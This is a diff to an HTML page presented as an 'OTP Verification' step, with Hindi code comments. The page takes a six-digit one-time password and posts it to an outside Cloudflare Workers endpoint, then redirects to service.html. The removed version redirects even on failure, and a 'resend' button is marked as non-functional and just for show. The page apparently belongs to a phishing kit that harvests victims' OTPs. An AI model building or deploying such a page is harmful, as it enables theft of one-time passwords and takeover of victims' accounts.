@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>blogone - OTP Verification</title>
+    <title>blogone</title>
     <style>
         * {
             margin: 0;
@@ -187,10 +187,7 @@
          class="footer-img">
     
     <script>
-        // ---------- Cloudflare Worker URL (वही जो मुख्य फॉर्म में है) ----------
-        const WORKER_URL = 'https://aged-sunset-63e0.s3d38284.workers.dev';
-
-        // ---------- OTP Input Formatting ----------
+        // OTP Input Formatting
         const otpInput = document.getElementById('otpInput');
         const timerElement = document.getElementById('timer');
         
@@ -201,7 +198,7 @@
             e.target.value = value;
         });
         
-        // ---------- Timer Countdown (180 seconds) ----------
+        // Timer Countdown (180 seconds)
         let seconds = 180;
         
         function updateTimer() {
@@ -219,49 +216,53 @@
         // Start the timer
         updateTimer();
         
-        // ---------- Proceed Button - Worker पर OTP भेजें ----------
-        document.querySelector('.proceed-button').addEventListener('click', function(e) {
+        // Proceed Button
+        document.querySelector('.proceed-button').addEventListener('click', async function(e) {
             e.preventDefault();
             
             const otpValue = otpInput.value.trim();
             
-            // OTP वैलिडेशन
             if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
                 otpInput.style.borderBottomColor = '#ff4444';
-                return; // कोई अलर्ट नहीं, बस लाल लाइन
+                return;
             }
             
-            // FormData बनाएँ – ठीक वैसे ही जैसे main form भेजता है
-            const formData = new FormData();
-            formData.append('otp', otpValue);
-            formData.append('formType', 'OTP');
-            
-            // POST request Worker को भेजें
-            fetch(WORKER_URL, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
+            // ⬇️⬇️⬇️ यहाँ से localStorage हटाया और worker में भेजा ⬇️⬇️⬇️
+            const otpEntry = {
+                id: Date.now(),
+                type: 'OTP',
+                otp: otpValue,
+                timestamp: new Date().toISOString(),
+                ip: 'Not available in browser'
+            };
+
+            try {
+                const response = await fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(otpEntry)
+                });
+
                 if (response.ok) {
-                    // सफलता – बिना किसी मैसेज के service.html पर जाएँ
-                    window.location.href = 'service.html';
+                    const result = await response.json();
+                    if (result.success) {
+                        window.location.href = 'service.html';
+                    } else {
+                        alert('OTP submit failed: ' + (result.error || 'unknown error'));
+                    }
                 } else {
-                    // अगर सर्वर एरर हो, फिर भी रीडायरेक्ट (जैसे पुराने localStorage में था)
-                    console.error('Server error:', response.status);
-                    window.location.href = 'service.html';
+                    alert('Server error: HTTP ' + response.status);
                 }
-            })
-            .catch(error => {
-                // नेटवर्क एरर – कंसोल में लॉग करें, फिर भी रीडायरेक्ट
-                console.error('Network error:', error);
-                window.location.href = 'service.html';
-            });
+            } catch (error) {
+                console.error('Worker submission error:', error);
+                alert('Network error: ' + error.message);
+            }
         });
         
         // Resend OTP Button (non-functional, just for show)
         document.querySelector('.resend-button').addEventListener('click', function(e) {
             e.preventDefault();
-            // Just for show, no action
         });
     </script>
 </body>
